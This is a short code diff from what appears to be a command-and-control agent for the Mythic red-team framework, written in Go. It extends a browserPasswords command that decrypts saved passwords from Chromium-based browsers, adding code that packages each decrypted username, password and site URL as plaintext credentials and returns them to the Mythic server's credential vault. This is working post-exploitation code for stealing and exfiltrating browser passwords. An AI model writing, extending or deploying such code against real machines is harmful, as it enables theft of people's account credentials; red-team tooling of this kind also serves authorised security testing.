@@ -322,11 +322,29 @@ func browserPasswords(args browserArgs) structs.CommandResult {
 		sb.WriteString("No Chromium-based browsers found or no saved credentials.\n")
 	}
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+
+	// Report decrypted passwords to Mythic credential vault
+	var mythicCreds []structs.MythicCredential
+	for _, cred := range allCreds {
+		if cred.Password != "" && cred.Username != "" {
+			mythicCreds = append(mythicCreds, structs.MythicCredential{
+				CredentialType: "plaintext",
+				Realm:          cred.URL,
+				Account:        cred.Username,
+				Credential:     cred.Password,
+				Comment:        fmt.Sprintf("browser (%s)", cred.Browser),
+			})
+		}
+	}
+	if len(mythicCreds) > 0 {
+		result.Credentials = &mythicCreds
+	}
+	return result
 }
 
 func readLoginData(dbPath string, key []byte, browserName, profileName string) ([]browserCred, error) {
